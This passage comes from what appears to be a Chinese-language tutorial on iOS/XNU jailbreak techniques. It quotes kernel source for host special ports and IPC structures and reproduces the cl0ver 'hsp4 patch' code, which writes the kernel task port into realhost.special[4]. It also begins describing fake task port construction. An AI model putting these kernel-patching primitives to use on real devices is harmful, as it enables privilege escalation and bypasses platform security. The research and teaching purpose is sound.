class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_SECURITY_PORT               0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_MIN_SPECIAL_PORT            HOST_SECURITY_PORT</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Always provided by kernel (cannot be set from user-space).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_PORT                        1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_PRIV_PORT                   2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_IO_MASTER_PORT              3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_MAX_SPECIAL_KERNEL_PORT     7 <span class="comment">/* room to grow */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_LAST_SPECIAL_KERNEL_PORT    HOST_IO_MASTER_PORT</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Not provided by kernel</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_DYNAMIC_PAGER_PORT         (1 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_AUDIT_CONTROL_PORT         (2 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_USER_NOTIFICATION_PORT     (3 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_AUTOMOUNTD_PORT            (4 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_LOCKD_PORT                 (5 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_KTRACE_BACKGROUND_PORT     (6 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_SEATBELT_PORT              (7 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_KEXTD_PORT                 (8 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_LAUNCHCTL_PORT             (9 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_UNFREED_PORT		(10 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_AMFID_PORT			(11 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_GSSD_PORT			(12 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_TELEMETRY_PORT		(13 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_ATM_NOTIFICATION_PORT	(14 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_COALITION_PORT		(15 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_SYSDIAGNOSE_PORT           (16 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_XPC_EXCEPTION_PORT		(17 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_CONTAINERD_PORT		(18 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_NODE_PORT			(19 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_RESOURCE_NOTIFY_PORT	(20 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_CLOSURED_PORT		(21 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_SYSPOLICYD_PORT		(22 + HOST_MAX_SPECIAL_KERNEL_PORT)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_MAX_SPECIAL_PORT		HOST_SYSPOLICYD_PORT</span></span><br><span class="line">                                        <span class="comment">/* MAX = last since rdar://35861175 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* obsolete name */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HOST_CHUD_PORT HOST_LAUNCHCTL_PORT</span></span><br></pre></td></tr></table></figure>

<p>从注释中可以看出前七个端口是为内核本身保留的。但是到目前为止，仅使用了其中的三个。HOST_PORT提供了主机的抽象，HOST_PRIV用于特权操作，而HOST_IO_MASTER_PORT用于与设备进行交互。每个特殊端口都有特定的编号，这非常重要。我们可以注意到没有使用编号4。</p>
<p>此外，为了获得发送到主机特殊端口的权限需要使用一个int参数调用<code>host_get_special_port</code>，该参数是分配给该特殊端口的编号。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *      User interface for setting a special port.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      Only permits the user to set a user-owned special port</span></span><br><span class="line"><span class="comment"> *      ID, rejecting a kernel-owned special port ID.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      A special kernel port cannot be set up using this</span></span><br><span class="line"><span class="comment"> *      routine; use kernel_set_special_port() instead.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">host_set_special_port</span><span class="params">(<span class="type">host_priv_t</span> host_priv, <span class="type">int</span> id, <span class="type">ipc_port_t</span> port)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (host_priv == HOST_PRIV_NULL || id &lt;= HOST_MAX_SPECIAL_KERNEL_PORT || id &gt; HOST_MAX_SPECIAL_PORT)</span><br><span class="line">		<span class="keyword">return</span> (KERN_INVALID_ARGUMENT);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> CONFIG_MACF</span></span><br><span class="line">	<span class="keyword">if</span> (mac_task_check_set_host_special_port(current_task(), id, port) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> (KERN_NO_ACCESS);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (kernel_set_special_port(host_priv, id, port));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *      User interface for retrieving a special port.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *      Note that there is nothing to prevent a user special</span></span><br><span class="line"><span class="comment"> *      port from disappearing after it has been discovered by</span></span><br><span class="line"><span class="comment"> *      the caller; thus, using a special port can always result</span></span><br><span class="line"><span class="comment"> *      in a &quot;port not valid&quot; error.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">kern_return_t</span></span><br><span class="line"><span class="title function_">host_get_special_port</span><span class="params">(<span class="type">host_priv_t</span> host_priv, __unused <span class="type">int</span> node, <span class="type">int</span> id, <span class="type">ipc_port_t</span> * portp)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">ipc_port_t</span> port;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (host_priv == HOST_PRIV_NULL || id == HOST_SECURITY_PORT || id &gt; HOST_MAX_SPECIAL_PORT || id &lt; HOST_MIN_SPECIAL_PORT)</span><br><span class="line">		<span class="keyword">return</span> (KERN_INVALID_ARGUMENT);</span><br><span class="line"></span><br><span class="line">	host_lock(host_priv);</span><br><span class="line">	port = realhost.special[id];</span><br><span class="line">	*portp = ipc_port_copy_send(port);</span><br><span class="line">	host_unlock(host_priv);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> (KERN_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看该函数，我们可以看到它需要host_priv端口作为参数，因此除了满足所有沙盒检查之外，执行此调用还需要root权限。<code>host_get_special_port</code>函数从<code>realhost.special[id]</code>得到端口值并返回给调用者。<br>回到指针检查，如果我们可以重新映射内核任务，将其写入未使用的端口空间，即<code>realhost.special[4]</code>，然后调用<code>host_get_special_port(4)</code>，这应该就可以得到可用的内核任务。</p>
<p>该技术也称为hsp4 patch，广泛用于最近的一些越狱中，<a target="_blank" rel="noopener" href="https://twitter.com/Siguza">Siguza</a>编写的cl0ver中的利用代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">patch_host_special_port_4</span><span class="params">(<span class="type">task_t</span> kernel_task)</span></span><br><span class="line">&#123;</span><br><span class="line">    DEBUG(<span class="string">&quot;Installing host_special_port(4) patch...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">addr_t</span> *special = (<span class="type">addr_t</span>*)offsets.slid.data_realhost_special;</span><br><span class="line">    <span class="type">vm_address_t</span> kernel_task_addr,</span><br><span class="line">                 kernel_self_port_addr,</span><br><span class="line">                 old_port_addr;</span><br><span class="line">    <span class="type">vm_size_t</span> size;</span><br><span class="line">    <span class="type">kern_return_t</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get address of kernel task</span></span><br><span class="line">    size = <span class="keyword">sizeof</span>(kernel_task_addr);</span><br><span class="line">    ret = vm_read_overwrite(kernel_task, (<span class="type">vm_address_t</span>)offsets.slid.data_kernel_task, <span class="keyword">sizeof</span>(kernel_task_addr), (<span class="type">vm_address_t</span>)&amp;kernel_task_addr, &amp;size);</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        THROW(<span class="string">&quot;Failed to get kernel task address: %s&quot;</span>, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line">    DEBUG(<span class="string">&quot;Kernel task address: &quot;</span> ADDR, (<span class="type">addr_t</span>)kernel_task_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get address of kernel task/self port</span></span><br><span class="line">    size = <span class="keyword">sizeof</span>(kernel_self_port_addr);</span><br><span class="line">    ret = vm_read_overwrite(kernel_task, kernel_task_addr + offsets.unslid.off_task_itk_self, <span class="keyword">sizeof</span>(kernel_self_port_addr), (<span class="type">vm_address_t</span>)&amp;kernel_self_port_addr, &amp;size);</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        THROW(<span class="string">&quot;Failed to get kernel task port address: %s&quot;</span>, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line">    DEBUG(<span class="string">&quot;Kernel task port address: &quot;</span> ADDR, (<span class="type">addr_t</span>)kernel_self_port_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check if realhost.special[4] is set already</span></span><br><span class="line">    size = <span class="keyword">sizeof</span>(old_port_addr);</span><br><span class="line">    ret = vm_read_overwrite(kernel_task, (<span class="type">vm_address_t</span>)(&amp;special[<span class="number">4</span>]), <span class="keyword">sizeof</span>(old_port_addr), (<span class="type">vm_address_t</span>)&amp;old_port_addr, &amp;size);</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        THROW(<span class="string">&quot;Failed to read realhost.special[4]: %s&quot;</span>, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(old_port_addr != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(old_port_addr == kernel_self_port_addr)</span><br><span class="line">        &#123;</span><br><span class="line">            DEBUG(<span class="string">&quot;Patch already in place, nothing to do&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            THROW(<span class="string">&quot;realhost.special[4] has a valid port already&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write to realhost.special[4]</span></span><br><span class="line">    ret = vm_write(kernel_task, (<span class="type">vm_address_t</span>)(&amp;special[<span class="number">4</span>]), (<span class="type">vm_address_t</span>)&amp;kernel_self_port_addr, <span class="keyword">sizeof</span>(kernel_self_port_addr));</span><br><span class="line">    <span class="keyword">if</span>(ret != KERN_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        THROW(<span class="string">&quot;Failed to patch realhost.special[4]: %s&quot;</span>, mach_error_string(ret));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DEBUG(<span class="string">&quot;Successfully installed patch&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="伪造任务端口"><a href="#伪造任务端口" class="headerlink" title="伪造任务端口"></a>伪造任务端口</h3><p>最近常见的越狱技术之一是使用伪造的端口。内核以为是端口，但是实际是用户控制的内存空间。然后使用某些API可以从内核中提取数据。<code>osfmk/ipc/ipc_port.h中定义</code>的端口结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> &#123;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Initial sub-structure in common with ipc_pset</span></span><br><span class="line"><span class="comment">	 * First element is an ipc_object second is a</span></span><br><span class="line"><span class="comment">	 * message queue</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> <span class="title">ip_object</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_mqueue</span> <span class="title">ip_messages</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ipc_space</span> *<span class="title">receiver</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> *<span class="title">destination</span>;</span></span><br><span class="line">		<span class="type">ipc_port_timestamp_t</span> timestamp;</span><br><span class="line">	&#125; data;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">ipc_kobject_t</span> kobject;</span><br><span class="line">		<span class="type">ipc_importance_task_t</span> imp_task;</span><br><span class="line">		<span class="type">ipc_port_t</span> sync_inheritor_port;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">knote</span> *<span class="title">sync_inheritor_knote</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">turnstile</span> *<span class="title">sync_inheritor_ts</span>;</span></span><br><span class="line">	&#125; kdata;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> *<span class="title">ip_nsrequest</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span> *<span class="title">ip_pdrequest</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ipc_port_request</span> *<span class="title">ip_requests</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">ipc_kmsg</span> *<span class="title">premsg</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">turnstile</span> *<span class="title">send_turnstile</span>;</span></span><br><span class="line">		SLIST_ENTRY(ipc_port) dealloc_elm;</span><br><span class="line">	&#125; kdata2;</span><br></pre></td></tr></table></figure>

<p>第一个成员是<code>ipc_object</code>，可以在<code>osfmk/ipc/ipc_object.h</code>中找到其定义：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The ipc_object is used to both tag and reference count these two data</span></span><br><span class="line"><span class="comment"> * structures, and (Noto Bene!) pointers to either of these or the</span></span><br><span class="line"><span class="comment"> * ipc_object at the head of these are freely cast back and forth; hence</span></span><br><span class="line"><span class="comment"> * the ipc_object MUST BE FIRST in the ipc_common_data.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If the RPC implementation enabled user-mode code to use kernel-level</span></span><br><span class="line"><span class="comment"> * data structures (as ours used to), this peculiar structuring would</span></span><br><span class="line"><span class="comment"> * avoid having anything in user code depend on the kernel configuration</span></span><br><span class="line"><span class="comment"> * (with which lock size varies).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_object</span> &#123;</span></span><br><span class="line">	<span class="type">ipc_object_bits_t</span> io_bits;</span><br><span class="line">	<span class="type">ipc_object_refs_t</span> io_references;</span><br><span class="line">	<span class="type">lck_spin_t</span>	io_lock_data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>ipc_object</code>的第一个成员<code>io_bits</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *	IPC steals the high-order bits from the kotype to use</span></span><br><span class="line"><span class="comment"> *	for its own purposes.  This allows IPC to record facts</span></span><br><span class="line"><span class="comment"> *	about ports that aren&#x27;t otherwise obvious from the</span></span><br><span class="line"><span class="comment"> *	existing port fields.  In particular, IPC can optionally</span></span><br><span class="line"><span class="comment"> *	mark a port for no more senders detection.  Any change</span></span><br><span class="line"><span class="comment"> *	to IO_BITS_PORT_INFO must be coordinated with bitfield</span></span><br><span class="line"><span class="comment"> *	definitions in ipc_port.h.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IO_BITS_PORT_INFO	0x0000f000	<span class="comment">/* stupid port tricks */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IO_BITS_KOTYPE		0x00000fff	<span class="comment">/* used by the object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IO_BITS_OTYPE		0x7fff0000	<span class="comment">/* determines a zone */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IO_BITS_ACTIVE		0x80000000	<span class="comment">/* is object alive? */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	io_active(io)		(((io)-&gt;io_bits &amp; IO_BITS_ACTIVE) != 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	io_otype(io)		(((io)-&gt;io_bits &amp; IO_BITS_OTYPE) &gt;&gt; 16)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	io_kotype(io)		((io)-&gt;io_bits &amp; IO_BITS_KOTYPE)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	io_makebits(active, otype, kotype)	\</span></span><br><span class="line"><span class="meta">	(((active) ? IO_BITS_ACTIVE : 0) | ((otype) &lt;&lt; 16) | (kotype))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Object types: ports, port sets, kernel-loaded ports</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	IOT_PORT		0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOT_PORT_SET		1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOT_NUMBER		2		<span class="comment">/* number of types used */</span></span></span><br></pre></td></tr></table></figure>

<p>需要设置IO_BITS_ACTIVE以确保该对象存活。IO_BITS_OTYPE指定对象类型。IO_BITS_KOTYPE指定端口类型，是一个任务端口或时钟端口等。创建伪造的端口时需要在io_bits中指定这些值。完整列表可以在<code>BUILD/obj/EXPORT_HDRS/osfmk/kern/ipc_kobject.h</code>中找到。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">092</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_NONE               0</span></span><br><span class="line"><span class="number">093</span>: <span class="meta">#<span class="keyword">define</span> IKOT_THREAD                1</span></span><br><span class="line"><span class="number">094</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_TASK               2</span></span><br><span class="line"><span class="number">095</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_HOST               3</span></span><br><span class="line"><span class="number">096</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_HOST_PRIV          4</span></span><br><span class="line"><span class="number">097</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_PROCESSOR          5</span></span><br><span class="line"><span class="number">098</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_PSET               6</span></span><br><span class="line"><span class="number">099</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_PSET_NAME          7</span></span><br><span class="line"><span class="number">100</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_TIMER              8</span></span><br><span class="line"><span class="number">101</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_PAGING_REQUEST     9</span></span><br><span class="line"><span class="number">102</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_MIG                10</span></span><br><span class="line"><span class="number">103</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_MEMORY_OBJECT      11</span></span><br><span class="line"><span class="number">104</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_XMM_PAGER          12</span></span><br><span class="line"><span class="number">105</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_XMM_KERNEL         13</span></span><br><span class="line"><span class="number">106</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_XMM_REPLY          14</span></span><br><span class="line"><span class="number">107</span>: <span class="meta">#<span class="keyword">define</span> IKOT_UND_REPLY         15</span></span><br><span class="line"><span class="number">108</span>: <span class="meta">#<span class="keyword">define</span> IKOT_HOST_NOTIFY       16</span></span><br><span class="line"><span class="number">109</span>: <span class="meta">#<span class="keyword">define</span> IKOT_HOST_SECURITY     17</span></span><br><span class="line"><span class="number">110</span>: <span class="meta">#<span class="keyword">define</span>    IKOT_LEDGER             18</span></span><br><span class="line"><span class="number">111</span>: <span class="meta">#<span class="keyword">define</span> IKOT_MASTER_DEVICE     19</span></span><br><span class="line"><span class="number">112</span>: <span class="meta">#<span class="keyword">define</span> IKOT_TASK_NAME         20</span></span><br><span class="line"><span class="number">113</span>: <span class="meta">#<span class="keyword">define</span> IKOT_SUBSYSTEM         21</span></span><br><span class="line"><span class="number">114</span>: <span class="meta">#<span class="keyword">define</span> IKOT_IO_DONE_QUEUE     22</span></span><br><span class="line"><span class="number">115</span>: <span class="meta">#<span class="keyword">define</span> IKOT_SEMAPHORE         23</span></span><br><span class="line"><span class="number">116</span>: <span class="meta">#<span class="keyword">define</span> IKOT_LOCK_SET          24</span></span><br><span class="line"><span class="number">117</span>: <span class="meta">#<span class="keyword">define</span> IKOT_CLOCK             25</span></span><br><span class="line"><span class="number">118</span>: <span class="meta">#<span class="keyword">define</span> IKOT_CLOCK_CTRL            26</span></span><br><span class="line"><span class="number">119</span>: <span class="meta">#<span class="keyword">define</span> IKOT_IOKIT_IDENT       27</span></span><br><span class="line"><span class="number">120</span>: <span class="meta">#<span class="keyword">define</span> IKOT_NAMED_ENTRY       28</span></span><br><span class="line"><span class="number">121</span>: <span class="meta">#<span class="keyword">define</span> IKOT_IOKIT_CONNECT     29</span></span><br><span class="line"><span class="number">122</span>: <span class="meta">#<span class="keyword">define</span> IKOT_IOKIT_OBJECT      30</span></span><br><span class="line"><span class="number">123</span>: <span class="meta">#<span class="keyword">define</span> IKOT_UPL               31</span></span><br><span class="line"><span class="number">124</span>: <span class="meta">#<span class="keyword">define</span> IKOT_MEM_OBJ_CONTROL       